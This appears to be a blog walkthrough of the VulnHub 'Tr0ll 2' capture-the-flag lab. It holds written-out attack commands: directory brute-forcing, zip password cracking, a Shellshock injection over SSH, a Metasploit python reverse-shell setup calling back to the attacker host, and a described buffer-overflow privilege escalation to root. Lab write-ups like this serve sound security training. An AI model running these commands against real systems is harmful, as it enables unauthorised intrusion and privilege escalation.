<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/vulnhub/" rel="category tag">VulnHub</a></span>            </div>
            <h1 class="post-title entry-title">Hack the Tr0ll 2 (Boot2Root Challenge)</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/hack-the-tr0ll-2-boot2root-challenge/" rel="bookmark"><time class="entry-date published" datetime="2016-07-28T11:32:28+00:00">July 28, 2016</time><time class="updated" datetime="2025-06-10T20:13:13+00:00">June 10, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000;">Hello everyone and welcome to this CTF challenge. This is the next part to Tr0ll by Maleus. You can download the lab from <strong><a style="color: #000000;" href="https://www.vulnhub.com/entry/tr0ll-2,107/"><span style="color: #0000ff;">here</span></a></strong>. The objective of this lab is to get root and capture the flag.</span></p>
<p><span style="color: #000000;">The level of this challenge is not so tough and its difficulty level is described as beginner/intermediate.</span></p>
<h3><span style="color: #800000;"><strong>Penetrating Methodologies</strong></span></h3>
<ul>
<li><span style="color: #000000;">Network scanning (Nmap, Netdiscover)</span></li>
<li><span style="color: #000000;">Information Gathering</span></li>
<li><span style="color: #000000;">Analyzing web source code</span></li>
<li><span style="color: #000000;">Get robort.txt</span></li>
<li><span style="color: #000000;">Directory enumeration with the help of robots.txt (Dirb)</span></li>
<li><span style="color: #000000;">Found encoded answer.txt file</span></li>
<li><span style="color: #000000;">Decoding base64 text file</span></li>
<li><span style="color: #000000;">FTP login for Zip file</span></li>
<li><span style="color: #000000;">Cracking zip file (Fcrackzip)</span></li>
<li><span style="color: #000000;">Exploiting shellshock to get a shell in bash.</span></li>
<li><span style="color: #000000;">Spwan tty shell (Metasploit)</span></li>
<li><span style="color: #000000;">Privilege escalation</span></li>
<li><span style="color: #000000;">Finding vulnerable binary</span></li>
<li><span style="color: #000000;">Finding EIP offset</span></li>
<li><span style="color: #000000;">Exploiting buffer overflow</span></li>
<li><span style="color: #000000;">Getting the root flag</span></li>
</ul>
<p><span style="color: #000000;">So, let’s get started!</span></p>
<p><span style="color: #000000;">The first step is as always, IP grabbing. In my case, the IP was 192.168.1.131. Use the following command to grab the IP :<br/>
</span></p>
<pre class="lang:default decode:true">netdiscover</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-HkoqRgEc920/W2GaTjvfT5I/AAAAAAAAZBI/leLCxQJ4JuMhvFBp_ETqOSJzBZRGt3wzwCLcBGAs/s1600/1.png"/></span></p>
<p><span style="color: #000000;">Next step was port scanning and the discovery of open ports using nmap.</span></p>
<pre class="lang:default decode:true">nmap -A 192.168.1.131</pre>
<p><span style="color: #000000;">And we found 3 ports open- <strong>21, 22, 80</strong>; with the service of <strong>FTP, SSH, and HTTP</strong> respectively.<br/>
</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-l7JeYrdqrVo/W2GaWCF_VxI/AAAAAAAAZB0/TWehooxmPtkoBQmiOoOta2ZnrDvAKuvUQCEwYBhgL/s1600/2.png"/></span></p>
<p><span style="color: #000000;">So, we tried to open the IP in the browser to see what was in the web page and sure as hell, that troll face again! It really did live up to its name after all!</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-VdfOTe5-_h4/W2GaYIQGM_I/AAAAAAAAZCc/tchx_cwu57c1zlhqnj52_HTtY5pTJtuWwCEwYBhgL/s1600/3.png"/></span></p>
<p><span style="color: #000000;">So, we opened the home page’s source code using curl:</span></p>
<pre class="lang:default decode:true">curl http://192.168.1.131</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-xW6zlpg_tfg/W2GaZE61ulI/AAAAAAAAZCo/xS_16RB1Vj4jn1w_nMrsuAhq2XUFg2m0wCEwYBhgL/s1600/4.1.png"/></span></p>
<p><span style="color: #000000;">We, then enumerated the IP using dirb to find something interesting and something did catch our eyes—robots.txt</span></p>
<pre class="lang:default decode:true">dirb http://192.168.1.131
</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-oEvleVNtPF4/W2GaZHaXooI/AAAAAAAAZCs/CJPtRVtjhLQ0d1EwkFiuPhJqa_qh71xnQCEwYBhgL/s1600/4.png"/></span></p>
<p><span style="color: #000000;">Therefore, we opened robots.txt in the web browser and we saw a lot of directory names.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-hqqtHTnUFEI/W2GaZgDU5-I/AAAAAAAAZCw/8LwdyZ4FabM34ubwsnTqq7Eu_cDHTC36ACEwYBhgL/s1600/5.png"/></span></p>
<p><span style="color: #000000;">So, we downloaded robots.txt using wget and tried to make a dictionary out of it in hope that we find something good in one of them.</span></p>
<pre class="lang:default decode:true">wget http://192.168.1.131/robots.txt
nano robots.txt</pre>
<p><span style="color: #000000;">(Removed the ‘/’ from each line and saved it)</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-rZ9PlpvQ1gc/W2GaZkSY76I/AAAAAAAAZC0/3zMDFIY-VyY9fuO5q1mo1cK1S3OzD542wCEwYBhgL/s1600/6.png"/></span></p>
<p><span style="color: #000000;">Enumerating it again with the custom dictionary we just made, few other directories were found.</span></p>
<pre class="lang:default decode:true">dirb http://192.168.1.131/ robots.txt</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-g6C4dHKwJiI/W2GaZxSMBNI/AAAAAAAAZC4/1q_azlBRr0AcrtKvCdh6u7VICo1Od1u4QCEwYBhgL/s1600/7.png"/></span></p>
<p><span style="color: #000000;">So, we hit each directory on the browser and inspected each image since there was nothing else to play within the directories.</span></p>
<p><span style="color: #000000;">One by one we started searching each directory but nothing appealed to us. It all had the same troll image.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-Vs6IrY1KUf0/W2GaaJKAVpI/AAAAAAAAZC8/F-dZZ-EzypQOcQmctmSDn-gwx7ZhLd-ngCEwYBhgL/s1600/8.png"/></span></p>
<p><span style="color: #000000;">We checked the source code of the page but nothing seemed good.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-eNAv0K_mvGc/W2GaaIyNKnI/AAAAAAAAZDA/gd40rh80ua8wc01NtUUiU-S_k6jfwDcWwCEwYBhgL/s1600/9.png"/></span></p>
<p> </p>
<p> </p>
<p><span style="color: #000000;">Hence, we downloaded cat_the_troll.jpg from each directory but one such directory called dont_bother had something interesting in its image.</span></p>
<pre class="lang:default decode:true">wget http://192.168.1.131/dont_bother/cat_the_troll.jpg</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-R8lZKczS0xw/W2GaTmVsvQI/AAAAAAAAZBM/OXtfKT99hlcNAuDEfgC5uLwMLWNeuqnlQCEwYBhgL/s1600/10.png"/></span></p>
<p><span style="color: #000000;">We read the last three lines of the image’s coding using tail command:</span></p>
<pre class="lang:default decode:true">tail –n 3 cat_the_troll.jpg</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-O52O26wlTo8/W2GaT1eCL1I/AAAAAAAAZBQ/ll5T5mXmJ08RWFzfVNHpv5KPmfOLdxH4ACEwYBhgL/s1600/11.png"/></span></p>
<p><span style="color: #000000;">The code really said to look deep within “y0ur_self” to find the answer. Could it be a directory? let’s find out.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/--rGBjcDYU3Q/W2GaUSX77gI/AAAAAAAAZBU/ZwhzEeHWRHwD7s2Bl5kwdOnkS4eBqKW3gCEwYBhgL/s1600/12.png"/></span></p>
<p><span style="color: #000000;">Voila! It indeed is a directory and really has an answer in it. But on opening <strong>answer.txt</strong>, the dictionary seemed to be <strong>base64</strong> encoded.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-Humg3T2JV48/W2GaUj1iDlI/AAAAAAAAZDE/EzdMeHTeQnkzx3Pkt5KLHygPttUZUV1uwCEwYBhgL/s1600/13.png"/></span></p>
<p> </p>
<p><span style="color: #000000;">We again downloaded the answer.txt file using wget and decoded it into a new file <strong>decoded.txt </strong></span></p>
<pre class="lang:default decode:true">wget http://192.168.1.131/y0ur_self/answer.txt</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-OPaMcTijHMA/W2GaUj1-qcI/AAAAAAAAZBc/bgZsvCkQbwQjAzz5aZ__YcVO8HMkJVJHwCEwYBhgL/s1600/14.png"/></span></p>
<p><span style="color: #000000;">Decoded it using:</span></p>
<pre class="lang:default decode:true">base64 -d answer.txt&gt;decoded.txt</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-sBgtTT50oLk/W2GaUzlY6EI/AAAAAAAAZBg/lLpCvT_KwkQTJef3vT7RkBU_NLx5LwxSQCEwYBhgL/s1600/15.png"/></span></p>
<p><span style="color: #000000;">Let’s save this dictionary for future use and move on to another port we discovered—the FTP port.</span></p>
<p><span style="color: #000000;">We had no idea of the username and password and neither was there any password or username file found.</span></p>
<p><span style="color: #000000;">But remember the very first source code we viewed? It had the author name Tr0ll.</span></p>
<p><span style="color: #000000;">Could that be the username and default password for FTP?</span></p>
<p><span style="color: #000000;">It was a complete hit and try method but we successfully got logged in!</span></p>
<pre class="lang:default decode:true">ftp 192.168.1.131
ls
get lmao.zip</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-KTw2sxYx0dQ/W2GaVEgasyI/AAAAAAAAZBk/ISBJdklsusc8MsME_FXSURPi1IiBOO0rQCEwYBhgL/s1600/16.png"/></span></p>
<p><span style="color: #000000;">We found a zip file “lmao.zip” in FTP. But the zip had password protection.</span></p>
<p><span style="color: #000000;">Wait… what about the file we just decoded? Could it have a password for the zip file?</span></p>
<pre class="lang:default decode:true">fcrackzip –u –D –p decoded.txt lmao.zip</pre>
<p><span style="color: #000000;">We found the password!. </span><span style="color: #000000;">Let’s unzip the file now.</span></p>
<pre class="lang:default decode:true">unzip lmao.zip</pre>
<p><span style="color: #000000;">And enter the password: <strong>ItCantReallybeThisEasyRightLOL</strong></span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-2yu1mH7O0xc/W2GaVnM09rI/AAAAAAAAZBo/p1UUHd-BCfI11DsbUI4T6vn_CisQTMZIwCEwYBhgL/s1600/17.png"/></span></p>
<p><span style="color: #000000;">We had a high curiosity about the file “noob”.</span></p>
<p><span style="color: #000000;"><strong>cat noob</strong></span></p>
<p><span style="color: #000000;">Turned out, it was an RSA key to SSH</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-22JX5pRWMng/W2GaVlqUsDI/AAAAAAAAZDE/gI9uehs6cOI2lffTSQ-GoO_ymg3xr65WQCEwYBhgL/s1600/18.png"/></span></p>
<p><span style="color: #000000;">Without any delay, we tried to login to SSH using this RSA key but we got trolled, yet again!</span></p>
<pre class="lang:default decode:true">chmod 600 noob
ssh –i noob noob@192.168.1.131</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-DgreLCKBXec/W2GaV8ptR_I/AAAAAAAAZBw/Gaptgd9npSMOqmLxO_Bxww0eyB8w6IF7wCEwYBhgL/s1600/19.png"/></span></p>
<p><span style="color: #000000;">A complete arrow in the dark was to exploit shellshock vulnerability in SSH. So, we tried the command:</span></p>
<pre class="lang:default decode:true">ssh –i noob noob@192.168.1.131 '() ( : ;}; /bin/bash'</pre>
<p><span style="color: #000000;">And we got logged in!</span></p>
<pre class="lang:default decode:true">id</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-LbBXmat_x3g/W2GaWCmmd8I/AAAAAAAAZB4/2qox-WWKDEAUfd7ENtinZjZ_pcqOFQvggCEwYBhgL/s1600/20.png"/></span></p>
<p><span style="color: #000000;">But it isn’t a proper teletype. We used web delivery in Metasploit to create a python shell to get a proper meterpreter session.</span></p>
<pre class="lang:default decode:true">msf &gt; use multi/script/web_delivery
msf exploit(multi/script/web_delivery) &gt; set payload python/meterpreter/reverse_tcp
msf exploit(multi/script/web_delivery) &gt; set lhost 192.168.1.132
msf exploit(multi/script/web_delivery) &gt; set lport 4444
msf exploit(multi/script/web_delivery) &gt; run</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-mctwU3pPDcc/W2GaWudIFuI/AAAAAAAAZB8/dCk1ZyIg0uYd4LWbCsqRtQ6O8dCQTsF1ACEwYBhgL/s1600/21.png"/></span></p>
<p><span style="color: #000000;">We copied above-generated python code to the improper bash we just created.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-V702QlFzghk/W2GaWtSTDzI/AAAAAAAAZCA/Sb9VqUzEaJkFSOei-21l3W9Ug8ufAId8wCEwYBhgL/s1600/22.png"/></span></p>
<p><span style="color: #000000;">On the other hand, we had got a meterpreter session.</span></p>
<pre class="lang:default decode:true">sysinfo</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-IOj104WULWA/W2GaW3sBiYI/AAAAAAAAZCE/cU94x3aePSMnvFyHwhPaNNNlzoVaX17TwCEwYBhgL/s1600/23.png"/></span></p>
<p><span style="color: #000000;">Let’s get into the shell and try to spawn a proper teletype.</span></p>
<pre class="lang:default decode:true">shell
python –c "import pty;pty.spawn('/bin/bash');"
find / -perm -4000 2&gt;/dev/null</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-M11LcTF74vQ/W2GaXFoSvpI/AAAAAAAAZCI/5Ng1ZUw-8dwLko-SHlJ0mNkG_VzHibOxgCEwYBhgL/s1600/24.png"/></span></p>
<p><span style="color: #000000;">The r00t binary in these directory work differently and change their behavior with each other on every reboot. One of these binaries (in our case it was in door2, it changes on reboot) accept a string as an argument and print it.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-PLL8ztseE7w/W2GaXH4NYDI/AAAAAAAAZCM/GNKfPTEdbMs0ZwCjl6Av3reQVXVuZdu6QCEwYBhgL/s1600/25.png"/></span></p>
<p><span style="color: #000000;">We open the binary in gdb debugger to look at the assembly code for the binary. At main+71 we find a strcpy function, as the strcpy function is vulnerable to buffer overflow we try to exploit it.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-5hglzlZh020/W2GaXrHy7BI/AAAAAAAAZCQ/4G7Gwexu9xQL0arQrtNu3He7f7a26lLiwCEwYBhgL/s1600/26.png"/></span></p>
<p><span style="color: #000000;">First, we create a 500 bytes long string to find the EIP offset using a pattern_create script.</span></p>
<pre class="lang:default decode:true">./pattern_create.rb -l 500</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-zbg0AGOMDw0/W2GaXhnd-OI/AAAAAAAAZCU/XU_RsrilSmwbSqjRNHmUNqq4LDcrRc0oQCEwYBhgL/s1600/27.png"/></span></p>
<p><span style="color: #000000;">We run the file in gdb along with the 500-byte character as the argument and find that the EIP register was overwritten with 0x6a413969.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-8mAnfIdPQZk/W2GaYDGJNKI/AAAAAAAAZCY/tzLYClAW8KcHNKvAcTcyqYiyGzdZK9CvACEwYBhgL/s1600/28.png"/></span></p>
<p><span style="color: #000000;">We pass that into /usr/share/metasploit-framework/tools/pattern_offset.rb, we get an offset of 268. So we need to write 268 characters and then write the address of the instructions we want to be executed.</span></p>
<pre class="lang:default decode:true">./pattern_offset.rb -q 6a413969</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-b2PPiUMJ1ck/W2GaYUfR1EI/AAAAAAAAZCg/zjTBw3OYgFwErx-xe49te30DykP2SzhjACEwYBhgL/s1600/30.png"/></span></p>
<p><span style="color: #000000;">After getting the offset we find the ESP and find it to be 0xbffffc70 but we create our own exploit and execute it. But we get an error with illegal instruction that is because gdb has a different environment. Now, we remove 1 byte and take the ESP to be 0xbffffc80. We run the binary code by ignoring the environment along the exploit as per the argument. As soon as we execute the exploit we get a spawn a shell as root, and then when you open the /root directory and find a file called Proof.txt. When you take a look at the content of the files and find the final flag.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-FzHIC1N0Ch0/W2GaY9Z04_I/AAAAAAAAZCk/jqYTPr1eXUwnRif6YaNwe9vsOCvJXzaeACEwYBhgL/s1600/31.png"/></span></p>
<p><span style="color: #000000;"><strong>Author: Harshit Rajpal </strong>is an InfoSec researcher and a left and right brain thinker. contact<strong> <a class="broken_link" style="color: #000000;" href="https://in.linkedin.com/in/harshit-rajpal-79bb43103">here</a></strong></span></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
